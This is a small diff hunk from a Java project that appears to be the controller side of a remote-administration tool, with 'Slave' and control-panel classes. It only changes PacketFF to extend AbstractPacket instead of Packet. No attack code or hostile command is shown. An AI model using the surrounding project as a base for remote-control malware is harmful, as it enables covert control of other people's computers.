@@ -5,7 +5,7 @@ import com.redpois0n.ui.frames.FrameControlPanel;
 import com.redpois0n.ui.panels.PanelControlSearch;
 import com.redpois0n.utils.IconUtils;
 
-public class PacketFF extends Packet {
+public class PacketFF extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
